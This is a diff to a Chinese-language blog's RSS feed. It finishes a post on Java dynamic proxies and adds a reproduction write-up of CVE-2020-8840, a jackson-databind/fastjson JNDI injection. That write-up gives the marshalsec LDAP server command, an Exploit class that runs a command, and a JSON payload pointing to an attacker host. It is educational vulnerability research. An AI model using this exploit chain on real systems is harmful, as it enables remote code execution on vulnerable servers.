+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;代理类的使用-1&quot;&gt;代理类的使用&lt;/h2&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;HelloInterface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        
+        &lt;span class=&quot;n&quot;&gt;InvocationHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProxyHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;HelloInterface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxyHello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HelloInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newProxyInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getInterfaces&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;proxyHello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayHello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;err&quot;&gt;输出：&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;Before&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;invoke&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sayHello&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;Hello&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zhanghao&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;After&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;invoke&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sayHello&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/9bcac608c714&quot;&gt;java动态代理&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/boboxing/p/8126046.html&quot;&gt;java的三种代理模式&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 09 Sep 2020 20:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/09/09/java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/09/09/java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</guid>
+        
+        <category>java</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>jackson-databind反序列化利用链fastjson复现（CVE-2020-8840）</title>
+        <description>&lt;h1 id=&quot;漏洞介绍&quot;&gt;漏洞介绍&lt;/h1&gt;
+
+&lt;p&gt;2月19日，NVD发布安全通告披露了jackson-databind由JNDI注入导致的远程代码执行漏洞（CVE-2020-8840），CVSS评分为9.8  。受影响版本的jackson-databind中由于缺少某些xbean-reflect/JNDI黑名单类，如org.apache.xbean.propertyeditor.JndiConverter，可导致攻击者使用JNDI注入的方式实现远程代码执行。&lt;/p&gt;
+
+&lt;h1 id=&quot;漏洞前提&quot;&gt;漏洞前提&lt;/h1&gt;
+
+&lt;p&gt;1、使用了xbean-reflect jar 包&lt;/p&gt;
+
+&lt;p&gt;2、使用了反序列化库，并反序列化参数用户可控（已知影响fastjson以及jackson）&lt;/p&gt;
+
+&lt;p&gt;3、被攻击机可向外访问攻击机主机&lt;/p&gt;
+
+&lt;h1 id=&quot;攻击方法&quot;&gt;攻击方法&lt;/h1&gt;
+
+&lt;h2 id=&quot;以fastjson为例&quot;&gt;以fastjson为例：&lt;/h2&gt;
+
+&lt;h3 id=&quot;1攻击者开启rmi或ldap&quot;&gt;1、攻击者开启rmi或ldap&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.132.1/#Exploit&quot; 9999
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;2攻击者部署恶意攻击类&quot;&gt;2、攻击者部署恶意攻击类&lt;/h3&gt;
+
+&lt;p&gt;地址：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.132.1/Exploit.class&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;源码：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;public class Exploit {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+        } catch (Exception e) {
+            // do nothing
+        }
+    }
+}
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;3发送攻击payload&quot;&gt;3、发送攻击payload&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;{
+    &quot;xxx&quot;:{
+        &quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,
+        &quot;asText&quot;:&quot;ldap://192.168.132.1:9999/Exploit&quot;,
+    }
+}
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Wed, 09 Sep 2020 20:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/09/09/jackson-databind%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEfastjson%E5%A4%8D%E7%8E%B0-CVE-2020-8840/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/09/09/jackson-databind%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEfastjson%E5%A4%8D%E7%8E%B0-CVE-2020-8840/</guid>
+        
+        <category>反序列化</category>
+        
+        <category>漏洞复现</category>
         
         
       </item>
